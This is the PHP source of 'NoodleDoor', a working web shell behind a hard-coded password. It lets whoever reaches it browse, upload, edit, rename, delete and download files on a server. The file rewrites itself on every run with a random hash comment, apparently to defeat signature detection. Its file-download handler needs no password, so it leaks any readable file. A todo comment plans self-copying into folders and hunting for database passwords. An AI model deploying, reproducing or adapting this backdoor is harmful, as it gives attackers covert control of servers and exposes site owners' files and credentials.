<? 
$pass = hash("sha256", "cake");

/*
NoodleDoor made by Zbee (Ethan Henderson) 2014 - https://github.com/zbee/noodledoor
Todo:
- File System
  - Detect things that don't have to be archived before downloading
  - Change file permissions
- Command line
  - Execute commands
  - See output of commands
- Database
  - Search file system for password
    - Search for files named mysql
    - Search within files for mysql functions
  - Log into database
  - View databases
  - View tables
  - View rows
  - Edit rows
  - Delete rows
  - Edit tables
  - Delete tables
  - Empty tables
  - Edit databases
  - Drop databases
  - Download databases
  - Download tables
  - Execute SQL
- Overall
  - Different versions
    -Hacker
      - Polymorphing (add stuff to different locations in file)
      - Copy itself (select folder to have NoodleDoor placed into all subsequent folders)
      - Database password detection (scan file system to see if passwords to database can be found)
      - From email detection (scan file system to see what email is used to send emails from the system)
    - Admin
      - 
*/

function endsWith($a,$b){$c=strlen($b);$d=$c*-1;return(substr($a,$d)===$b);}
function startsWith($a,$b){$c=strlen($b);return(substr($a,0,$c)===$b);}
function emptyDir($a){if(is_dir($a)){$b=scandir($a);foreach($b as $c){if($c!="."&&$c!=".."){if(is_dir($a."/".$c))emptyDir($a."/".$c);else unlink($a."/".$c);}}reset($b);rmdir($a);}}
function dirsize($a){$b=new RecursiveIteratorIterator(new RecursiveDirectoryIterator($a));$c = 0;foreach($b as $d){$c+=$d->getSize();}return $c;}
function getsize($a,$b=2){if(is_file($a)){$a=filesize($a);}elseif(is_dir($a)){$a=dirsize($a);}return$a;}
function hsize($a,$b=2){$a=getsize($a);$c=array('b','kb','mb','gb','tb','pb','eb','zb','yb');$d=floor((strlen($a)-1)/3);return sprintf("%.{$b}f",$a/pow(1024,$d)).@$c[$d];}
function hperms($a){$b=fileperms($a);if(($b&0xC000)==0xC000){$c='s';}elseif(($b&0xA000)==0xA000){$c='l';}elseif(($b&0x8000)==0x8000){$c='-';}elseif(($b&0x6000)==0x6000){$c='b';}elseif(($b&0x4000)==0x4000){$c='d';}elseif(($b&0x2000)==0x2000){$c='c';}elseif(($b&0x1000)==0x1000){$c='p';}else{$c='u';}$c.=(($b&0x0100)?'r':'-');$c.=(($b&0x0080)?'w':'-');$c.=(($b&0x0040)?(($b&0x0800)?'s':'x'):(($b&0x0800)?'S':'-'));$c.=(($b&0x0020)?'r':'-');$c.=(($b&0x0010)?'w':'-');$c.=(($b&0x0008)?(($b&0x0400)?'s':'x'):(($b&0x0400)?'S':'-'));$c.=(($b&0x0004)?'r':'-');$c.=(($b&0x0002)?'w':'-');$c.=(($b&0x0001)?(($b&0x0200)?'t':'x'):(($b&0x0200)?'T':'-'));return $c;}
function hpath(){global $pass;global $path;$a=array_filter(explode("/",$path));$b="";$c="";foreach($a as $d){$b.="/".$d;$c.="<li><a p='$pass' dir='$b' class='a'>$d</a></li>";}return "<ol class='breadcrumb'>$c<a href='?dl=$path' target='_blank' class='btn btn-xs btn-default pull-right'><i class='glyphicon glyphicon-download' aria-hidden='true'></i> Download Folder</a><form id='file' action='' method='post' enctype='multipart/form-data' class='form form-inline pull-right'><input type='hidden' name='action' value='upload'><input type='hidden' name='p' value='$pass'><input type='hidden' name='dir' value='$path'><span class='btn btn-xs btn-default btn-file'><i class='glyphicon glyphicon-upload' aria-hidden='true'></i> Upload File<input type='file' name='file'></span><input type='submit' style='display:none;'></form><button type='button' class='btn btn-default btn-xs pull-right' data-toggle='modal' data-target='#modNew'><i class='glyphicon glyphicon-plus'></i> Create File</button></ol><div class='modal fade' id='modNew' tabindex='-1' role='dialog' aria-labelledby='myModalLabel' aria-hidden='true'><div class='modal-dialog'><div class='modal-content'><div class='modal-header'><button type='button' class='close' data-dismiss='modal'><span aria-hidden='true'>&times;</span><span class='sr-only'>Close</span></button><h4 class='modal-title' id='myModalLabel'>Create a new File</h4></div><form action='' method='post' class='form'><div class='modal-body'><div class='form-group'><label for='newname'>Name of File</label><input type='text' id='newname' class='form-control' name='target'></div><input type='hidden' name='p' value='$pass'><input type='hidden' name='dir' value='$path'><input type='hidden' name='action' value='create'></div><div class='modal-footer'><button type='button' class='btn btn-default' data-dismiss='modal'>Close</button><input type='submit' value='Create' class='btn btn-default'></div></form></div></div></div>";}
function relPath($a,$b=__FILE__){if($a == $b){return "./";}$b=is_dir($b)?rtrim($b,'\/').'/':$b;$a=is_dir($a)?rtrim($a,'\/').'/':$a;$b=str_replace('\\','/',$b);$a=str_replace('\\','/',$a);$b=explode('/',$b);$a=explode('/',$a);$c=$a;foreach($b as $d=>$e){if($e===$a[$d]){array_shift($c);}else{$f=count($b)-$d;if($f>1){$g=(count($c)+$f-1)*-1;$c=array_pad($c,$g,'..');break;}else{$c[0]='./'.$c[0];}}}return implode('/',$c);}
function _download($a,$b){header('Content-Description: File Transfer');header('Content-Type: application/octet-stream');header('Content-Length: '.getsize($a));header('Content-Disposition: attachment; filename='.basename($b));readfile(str_replace("/","",$a));}
function dlDir($d){try {$j=md5(str_replace("/", "", $d)) . ".tar";$a=new PharData($j);$a->buildFromDirectory(relPath($d));}catch(Exception $e){echo $e;}_download($j, $j);unlink($j);}
function dlFile($d){try {$j=md5(str_replace("/", "", $d)) . ".tar";$a=new PharData($j);$a->addFile(relPath($d));}catch(Exception $e){echo $e;}_download($j, $j);unlink($j);}

if (isset($_GET["dl"])) {
  if (is_file($_GET["dl"])) {
    dlFile($_GET["dl"]);
  } elseif (is_dir($_GET["dl"])) {
    dlDir($_GET["dl"]);
  }
  exit;
}

if (hash("sha256", $_POST['p']) == $pass || $_POST['p'] == $pass) {
  $nof = explode("/", __FILE__)[count(explode("/", __FILE__))-1];
  $path = isset($_POST['dir']) ? $_POST['dir'] : __FILE__;
  $path = endsWith($path, $nof) && strlen($path) == strlen(__FILE__) ? substr($path, 0, (-1 * strlen($nof))) : $path;
  $path = startsWith($path, "/") ? $path : "/" . $path;
  $path = endsWith($path, "/") ? $path : $path . "/";
  $path = endsWith($path, "../") ? substr($path, 0, (-1 * (strlen(explode("/", $path)[count(explode("/", $path))-3]) + 4))) : $path;
  $bod = "";
  
  if (isset($_GET["c"])) {
	  $bod .= "";
  } elseif (isset($_GET["d"])) {
	  
  } else {
	  $bod .= hpath();
	  $action = isset($_POST["action"]) ? ($_POST["action"] == "browse" ? "browse" : ($_POST["action"] == "edit" ? "edit" : ($_POST["action"] == "delete" ? "delete" : ($_POST["action"] == "edit" ? "edit" : ($_POST["action"] == "rename" ? "rename" : ($_POST["action"] == "upload" ? "upload" : ($_POST["action"] == "create" ? "create" : "browse"))))))) : "browse";
	  if ($action == "delete") {
      if ($_POST["target"] != __FILE__ && !startsWith(__FILE__, $_POST["target"])) {
        if (is_file($_POST["target"])) {
          unlink($_POST["target"]);
        } elseif (is_dir($_POST["target"])) {
          emptyDir($_POST["target"]);
        }
      }
      $action = "browse";
	  } elseif ($action == "create") {
      if (!is_file($_POST["target"])) {
        file_put_contents($_POST["target"], "");
      }
      $action = "browse";
	  } elseif ($action == "rename") {
      if ($_POST["target"] != __FILE__ && !startsWith(__FILE__, $_POST["target"])) {
        rename($_POST["target"], $_POST["dir"].$_POST["change"]);
        $action = "browse";
      }
      $action = "browse";
	  } elseif ($action == "upload") {
      $target_file = $path . basename($_FILES["file"]["name"]);
      $uploadOk = 1;
      $uploadOk = 1;
      if (file_exists($target_file)) {
        echo "File already exists.";
        $uploadOk = 0;
      }
      if ($uploadOk == 0) {
        echo "Your file was not uploaded.";
      } else {
        if (move_uploaded_file($_FILES["file"]["tmp_name"], $target_file)) {
          
        } else {
          echo "There was an error uploading your file.";
        }
      }
      $action = "browse";
    } elseif ($action == "edit" && strlen($_POST['new']) < 4) {
      $file = explode("/", $_POST["target"])[count(explode("/", $_POST["target"]))-1];
      $bod .= "Editing <strong>$file</strong><br><br><form method='post' action=''><input type='hidden' name='p' value='$pass'><input type='hidden' name='dir' value='$path'><input type='hidden' name='action' value='edit'><input type='hidden' name='target' value='$_POST[target]'><textarea name='new' style='width:95%' rows='20'>" . htmlentities(file_get_contents($_POST["target"])) . "</textarea><br><input type='submit' value='Save' class='btn btn-primary'></form>";
	  } elseif ($action == "edit" && strlen($_POST['new']) > 4) {
      $file = explode("/", $_POST["target"])[count(explode("/", $_POST["target"]))-1];
      file_put_contents($_POST["target"], $_POST['new']);
      $bod .= "Editing <strong>$file</strong><br><br>File saved!<br><form method='post' action=''><input type='hidden' name='p' value='$pass'><input type='hidden' name='dir' value='$path'><input type='hidden' name='action' value='edit'><input type='hidden' name='target' value='$_POST[target]'><textarea name='new' style='width:95%' rows='20'>" . htmlentities(file_get_contents($_POST["target"])) . "</textarea><br><input type='submit' value='Save' class='btn btn-primary'></form>";
	  }
	  if ($action == "browse") {
      $dir = scandir($path);
      $bod .= "<table class='col-xs-12 table table-bordered table-condensed table-responsive table-striped'><tr><th>Name</th><th>Size</th><th>Permissions</th><th>Owner</th><th>Date Modified</th><th></th></tr>";
      $dirs = "";
      $files = "";
      foreach ($dir as $file) {
        $sfile = preg_replace("/[^a-zA-Z0-9]+/", "", $file);
        if ($file == ".") { continue; }
        if (is_dir($path . $file)) {
          $stats = [];
          $stats["name"] = "<a p='$pass' dir='$path$file' class='a'><i class='glyphicon glyphicon-folder-open'></i> /$file</a>";
          $stats["perms"] = "";
          $stats["owner"] = "";
          $stats["size"] = $file != ".." ? hsize($path . $file) : "";
          $chsums = "";
          $delete = "<a dir='$path' action='delete' target='$path$file' class='btn btn-xs btn-danger'><i class='glyphicon glyphicon-trash' aria-hidden='true'></i> Delete</a>";
          $isdir = true;
        } elseif (is_file($path . $file)) {
          $stats = stat($path . $file);
          $stats["name"] = "<a p='$pass' dir='$path' action='edit' target='$path$file' class='a'><i class='glyphicon glyphicon-file'></i> $file</a>";
          $stats["perms"] = hperms($path . $file);
          $stats["owner"] = posix_getpwuid(fileowner($path . $file))["name"];
          $stats["size"] = hsize($path . $file);
          $hashes = "";
          foreach (hash_algos() as $v) {
            $r = getsize($path . $file) < 1980000000 ? hash_file($v, $path . $file) : "<a href='http://php.net/manual/en/function.hash-file.php#103656'>file too large</a>";
            $stats["hashes"][$v] = $r; 
            $sr = strlen($r) > 55 ? substr($r, 0, 52) . "..." : $r;
            $hashes .= "<tr><td>$v</td><td><span title='$r'>$sr</span></td></tr>";
          }
          $chsums = "<button type='button' class='btn btn-default btn-xs' data-toggle='modal' data-target='#mod$sfile'><i class='glyphicon glyphicon-lock'></i> Checksums</button><div class='modal fade' id='mod$sfile' tabindex='-1' role='dialog' aria-labelledby='myModalLabel' aria-hidden='true'><div class='modal-dialog'><div class='modal-content'><div class='modal-header'><button type='button' class='close' data-dismiss='modal'><span aria-hidden='true'>&times;</span><span class='sr-only'>Close</span></button><h4 class='modal-title' id='myModalLabel'>$file Checksums</h4></div><div class='modal-body'><table class='table table-responsive table-striped table-bordered hashes'>".$hashes."</table></div><div class='modal-footer'><button type='button' class='btn btn-default' data-dismiss='modal'>Close</button></div></div></div></div>";
          $delete = "<a dir='$path' action='delete' target='$path$file' class='btn btn-xs btn-danger a'><i class='glyphicon glyphicon-trash' aria-hidden='true'></i> Delete</a>";
          $isdir = false;
        }
        $stats["name"] = $file != ".." && $file != $nof ? "<button type='button' onClick='$(\"#s$sfile\").toggle();$(\"#f$sfile\").toggle();' class='btn btn-default btn-xs pull-right'><i class='glyphicon glyphicon-pencil'></i></button><span id='s$sfile'>" . $stats["name"] . "</span><form id='f$sfile' action='' method='post' style='display:none' class='form form-inline'><input type='text' name='change' value='$file' class='form-control input-sm'><input type='hidden' name='p' value='$pass'><input type='hidden' name='target' value='$path$file'><input type='hidden' name='action' value='rename'><input type='hidden' name='dir' value='$path'><input type='submit' style='display:none'></form>" : $stats["name"];
        $stats["date"] = date("Y-m-d, g:ma", filectime($path . $file));
        $download = "<a href='?dl=$path$file' target='_blank' class='btn btn-xs btn-primary'><i class='glyphicon glyphicon-download-alt' aria-hidden='true'></i> Download</a>";
        $echo = "<tr>
          <td>$stats[name]</td>
          <td>$stats[size]</td>
          <td>$stats[perms]</td>
          <td>$stats[owner]</td>
          <td>$stats[date]</td>
          <td>$delete $download $chsums</td>
        </tr>";
        if ($isdir) {
        $dirs .= $echo;
        } else {
        $files .= $echo;
        }
      }
      $bod .= $dirs;
      $bod .= $files;
	  }
  }
} else {
  $bod .= "
  <div class='col-xs-offset-0 col-xs-12 col-md-offset-4 col-md-4'>
    <form class='form-inline' role='form' method='post'>
      <div class='form-group'>
        <label class='sr-only' for='p'>Password</label>
        <input type='password' class='form-control' id='p' name='p' placeholder='Password'>
      </div>
      <button type='submit' class='btn btn-default'>Sign in</button>
    </form>
  </div>";
}

$rtext = hash("sha512", substr(str_shuffle(str_repeat("!\"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`abcdefghijklmnopqrstuvwxyz{|}~",rand(15,50))),1,rand(256,4096)));
file_put_contents(__FILE__, file_get_contents(__FILE__) . "\n<!--$rtext-->");
?>

<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="description" content="A program for remote viewing the filesystem, database, and using the command line for system administrators away from home">
    <meta name="author" content="Zbee">

    <title>NoodleDoor</title>

    <link href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.1/css/bootstrap.min.css" rel="stylesheet">
    <style>
    a { cursor:pointer; }
    body { margin-top: 75px; }
    .hashes { max-width: 300px !important; }
    .btn-file {
        position: relative;
        overflow: hidden;
      }
      .btn-file input[type=file] {
        position: absolute;
        top: 0;
        right: 0;
        min-width: 100%;
        min-height: 100%;
        font-size: 100px;
        text-align: right;
        filter: alpha(opacity=0);
        opacity: 0;
        outline: none;
        background: white;
        cursor: inherit;
        display: block;
      }
    </style>

    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
      <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
    <![endif]-->
  </head>

  <body id="bod">

    <nav class="navbar navbar-inverse navbar-fixed-top" role="navigation">
      <div class="container container-fluid">
        <div class="navbar-header">
          <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar" aria-expanded="false" aria-controls="navbar">
            <span class="sr-only">Toggle navigation</span>
            <span class="icon-bar"></span>
            <span class="icon-bar"></span>
            <span class="icon-bar"></span>
          </button>
          <a class="navbar-brand" href="<?=$nof?>?">NoodleDoor</a>
        </div>
        <div id="navbar" class="collapse navbar-collapse">
          <ul class="nav navbar-nav">
            <li <? if (!isset($_GET["c"]) && !isset($_GET["d"])) { echo 'class="active"'; } ?>><a href="<?=$nof?>?">File System</a></li>
            <li <? if (isset($_GET["c"])) { echo 'class="active"'; } ?>><a href="<?=$nof?>?c">Command Line</a></li>
            <li <? if (isset($_GET["d"])) { echo 'class="active"'; } ?>><a href="<?=$nof?>?d">Database</a></li>
          </ul>
          <ul class="nav navbar-nav navbar-right">
            <li><a href="https://github.com/Zbee" target="_blank">Made by Zbee</a></li>
          </ul>
        </div><!--/.nav-collapse -->
      </div>
    </nav>

    <div class="container">
    <?=$bod?>
    </div><!-- /.container -->

    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.1/js/bootstrap.min.js"></script>
    <script>
    $(".a").click(function () {
      $(".container").remove();
      $("body").load("./<?=$nof?>", {p: "<?=$pass?>", dir: $(this).attr("dir"), action: $(this).attr("action"), target: $(this).attr("target")});
    });
    $(".breadcrumb li:first-child").html($(".breadcrumb li:first-child a").html()).addClass("active");
    $("input:file").change(function (){
      $("#file").submit();
    });
    </script>
  </body>
</html>
<!--ae21d1a11fa6eba09400507a878b8f984000812cab6de0e92c1b69612ac03889d1d0c9e0b4a8fd83c9e2d22f9aa28e40df12e00af02c7bc982351e54aa72aabc-->
<!--29c58c51486f4c6bb6739cc3cb6cceea3ed690a99ba6b68bd7a3cd25a0b317a94321e9eb097b34186265f62084bca4d076ffb0da9790f1ddca2513215b17b6b4-->
<!--f78477d67cbed652ad40bd8c4d2c5eb2bf301eeb8a6bb9237b033603159f9a77887e6698e35d849d2c35a6e0a46fbd745249dac07e49a791d6794f809ee7a7cf-->
<!--bf7aa71fd746580a56c622b17142b0904ecda5400c8f954d7d58aca8ab733315e1516a674282f41cd461cc6b757bf186eb0c7d21bb4ac9df2a740d8e5d1a1ad0-->
<!--214a63239cf5017837dde03dec7c379c51441b40654fddef57447b685b2635264faf10ae550b278dd70f01c0000a3b206092f00609495729a427f68361f5f6b3-->
<!--d43f3f2651f3d74acdd9aec7fbf9bbb19c3c550e9825ef3cad7f83292a57c27ce13750c0251c40e176564258400356aa160b542d06a6734caf23c4ccd52181a0-->
<!--93c9787b2b48bebca0ac8761068f5119822cf1156bfa471b4d67e7b2221a51c2d1dd90fa664e7dc68fb436032c9e6eee062a6d67fd6b4b704003e2f7d67895d2-->
<!--8f2d2ac1d2fbc019bc3cb31ac5f2872ff3522faeb4dbcda45bf90517c4a0bedef43e0fb58a746dc142e60789a5742b074e7612e8813dd8df4752f5200b182644-->
<!--aa9c195c255ada871d4e34b65bac67a7c0eeae448ebc185cd69fb14d8aba89da80b3918bb5cd0b9e8d876a9b52a38a9d528be1007889bf13fc3991fbf2906138-->
<!--525e1550addffe9107a2ce5709328b828f470402dec7f9b55699cecfd97d05bdf9ddad6d4ade5c7623a8ff01ced086c05be73be1da837bd6ef7825b112008c80-->
<!--1e36d1fad1f69fa58cd395984cbee20c7e18cb7f4110ed2fc7209967a714a92ba25529315e6daa7294c34ecb3f4d80ff9e3f41f8e1838665e96db0d160539cfb-->
<!--5be6cb058e7100c34d87d90118e88b51346b8a95b034f8266dffd43d42bce7093f51e80e4cfe067d9cf19df31d171c6e9b6435e6d580addce3a7ccf030b64453-->
<!--c29c360203aceb6c7ebeb7426bb3853163f8c373b3781af5b9f5dd9358e733ab71cc23836208938d54f9e21dd8353a6261d5cb968fd192bc91f2c82f0354433c-->
<!--6ef9fdc80643f9cde65e0e23d30ea9af6b0cda0b1724af220b8daf6432022d384139c46f6894e675a6b03864cbbe7116d984755d15564952c35c042e5da740a5-->
<!--6fd2639a424dc0f6b72e3b098a25bd2d39786a63de0557860d1f26d1783cae32b866c63172e8f4aaaecea938ef3b958e39b3710cdfd5a789df07d239aa7f965d-->
<!--f3dfd7ddde2ab8a2a77b8c7989f8534626a967fcadb25d187b1ffecdd9040c87abdfc6252f05464c2ac1eede688603012c2cc415b2db07bc44fc2c5d12a76963-->
<!--fec214c9b22ef6ef5381a4b9d7c43a2cce3530bfc63120ab9844aee858637345a644ba5eedf87dcaf998f906a104beb69a38e18e934e734a5816c5b28f735fbf-->
<!--ccc5d1a88f980fd9bb8e242b297c21fbd9ab0bcbd9ac99dc96cf1c057306c782364c48870411c8437a441237bc895ab66264d7dd16855c3e44aa9f98e96faab5-->
<!--c726860adfe9a7613a8cc02ae21f60509eb3275c3a2e2cc288ace0fe47a2031a6183957cc70fd982e9e20256d3430b0e4243a2ace68ee4f071548e745c79ae58-->
<!--e303fc23e364670537857592044d1d0f5318aaee0039e767f3efd080cc6ac956b4a133758e9a274779fdd0ddf7d3157db4793627ca48c7dcaea72e1098a3fe4b-->
<!--5d49e2541781bd6aaf98a258506d6d3ac29e7749a2fecb2dd0b4093fb6ac808a6679ecca47ce622f3762fd821c72b786f671aafc1fbb6cc09ec2aad4281ed40b-->
<!--43d9407bc608efbb56ad1050350aaec40de39bf408da539c14fbd4be687d6543101dca2b6f5a15beb27228ce91df684eb1017f45092b02e62ae429db9ece359f-->
<!--35eba5a7bbbafa4125fa9639d8b511d69c4eb4caada8112e1491882f0c5fe0dc7d10d999a7c9f79e471d53c4dc7e63adb885f45b3c3a112395bc57d72d22f3f7-->
<!--3751c4dee3a135c45a3e44e79c99c6150a2f5e13b0738f1e636fc153016f16a61102cef83c7448479ce34556ff918519c0f248165399f3aa90dee6817a567bab-->
<!--85482f81de0edd3fd9907ad06655b385bc70eca6375788225da75e1acbdd129fd455904ad3a90f4749351ac3ea72eae105096b22986c8e58e05d19901f8d5897-->
<!--78cfbbc0c251d59225ee57476028ff13264751fb3c08fbb6418e95ac82b4a95cf81e41394018163b70727744bfd77dadb43e99730bc8736a895ab071c30b113e-->
<!--b246ffca6c84bc4f1bcfb6b03a7b07c69bdded9b144d34c07318e5e138ed522f618999c128f6282bddc9d4cf389cc9231fa2da1917d2b844b74712a5eb8ecc6b-->
<!--6aa5040d65e9611b29f3f9a4cadee2781608fd0bd5e204a433af5bc1ef6f4898613156586ba6c5b04d5a3afa7b4d892497fee5ad20251a37b15ab830a154e226-->
<!--022867b7cf61467c206b6ffeda9d116c2a1c4fcec932181470daa4a0d51e76cb169c69f8ae138b57e4668831955282b919c458ee90a1da34518937b494783c7f-->